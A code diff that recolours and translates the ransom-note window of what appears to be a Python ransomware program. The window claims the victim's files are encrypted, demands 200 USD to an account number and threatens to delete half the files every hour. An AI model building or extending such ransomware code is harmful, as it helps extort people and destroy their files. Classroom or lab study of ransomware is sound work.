@@ -63,21 +63,21 @@ class MyTk:
                                     text="\nYour computer files have been encrypted.\nYour photos, documents, etc...\nBut, don't worry! I have not deleted them yet :D"
                                          "\nYou have some time to pay 200USD in this accoutn(KB 786102-00-040854) to get the decryption key\n"
                                          "Every hour half of all files will be deleted.\n",
-                                    fg="red", bg="black", font='Helvetica 14 bold')
+                                    fg="green", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
 
-        self.l_timer = tkinter.Label(self.window, text="타이머 시작", fg="red", bg="black", font='Helvetica 14 bold')
+        self.l_timer = tkinter.Label(self.window, text="start the timer!", fg="green", bg="black", font='Helvetica 14 bold')
         self.l_timer.pack()
 
         self.l_input = tkinter.Label(self.window,
                                      text="\npassword:",
-                                     fg="red", bg="black", font='Helvetica 14 bold')
+                                     fg="green", bg="black", font='Helvetica 14 bold')
         self.l_input.pack()
 
         self.password = tkinter.Entry(self.window)
         self.password.pack()
 
-        self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit,disabledforeground='red')
+        self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit, disabledforeground='green')
         self.pwbutton.pack()
 
         self.thanos = tkinter.PhotoImage(file="../ui/face.png")
@@ -134,7 +134,7 @@ class MyTk:
     def allRemovePrint(self):
         self.l_thanos.pack_forget()
         l_allremove = tkinter.Label(self.window, text="\n\nYour files are all deleted.\n\n",
-                                    fg="red", bg="black", font='Helvetica 16 bold')
+                                    fg="green", bg="black", font='Helvetica 16 bold')
         l_allremove.pack()
         sleep(3)
         self.listwindow.destroy()
@@ -171,7 +171,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
     gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_filelist]),
-                             background="black", fg="red",
+                             background="black", fg="green",
                              font='Helvetica 14 bold')
     gui.listWindow.lift()
     gui.list.pack()
